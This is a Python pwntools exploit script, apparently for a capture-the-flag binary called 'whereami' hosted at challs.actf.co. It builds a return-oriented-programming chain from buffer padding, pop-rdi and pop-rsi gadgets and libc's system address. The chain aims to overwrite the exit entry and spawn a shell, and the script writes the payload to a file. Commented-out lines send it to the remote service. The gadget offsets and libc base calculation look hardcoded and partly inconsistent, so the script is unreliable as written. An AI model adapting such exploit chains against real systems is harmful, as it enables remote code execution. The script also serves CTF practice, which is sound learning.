from pwn import *

context.arch='amd64'
elf = ELF('whereami')

print(f"{hex(elf.plt.exit)=}")
print(f"{hex(elf.got.exit)=}")

libc = ELF('libc.so.6')
diff = elf.symbols['exit'] - libc.symbols['exit']
libc.address=diff

print(f"{hex(libc.symbols.exit)=}")

rop = ROP(libc)
sh = 0x00000000001b45bd #next(libc.search(b'/bin/sh'))
print(f"{hex(sh)=}")
poprdi = 0x0000000000401303
poprsi = 0x0000000000401301
mov_ptr_rdi_rsi = 0x0000000000057b8a
pushrdi = 0x00000000000e312b
sm = libc.symbols[b'system']# next(libc.search(b'/bin/sh'))
# 0x00000000001507f9 # pop rax; call rax
rop.raw('a'*0x40)
rop.raw(unpack(b'AAAAAAAA'))
rop.raw(p64(poprdi))
rop.raw(p64(elf.plt.exit))
rop.raw(p64(poprsi))
rop.raw(p64(libc.symbols.system))
rop.raw(p64(libc.symbols.system))
rop.raw(p64(mov_ptr_rdi_rsi))
rop.raw(p64(poprdi))
rop.raw(p64(elf.plt.exit))
rop.raw(p64(0x00000000041235))
#rop.call('system', [next(libc.search(b'/bin/sh\x00'))])
#$poprdi_addr = rop.find_gadget('rdi')
#$sh_addr = rop.
#$system_addr = libc.symbols.system
#$craft = [
    #$b"A"*0x40,
    #$b"KKKKLLLL",
    #$p64(poprdi_addr),
    #$p64(sh_addr),
    #$p64(system_addr)
#$]
#$payload = b"".join(craft)
with open('in2.txt','wb') as f:
    f.write(bytes(rop))

#p = remote('challs.actf.co', 31222)
#p = process('whereami')

#p.recvuntil(b'?')
#p.sendline(payload)
#p.interactive()
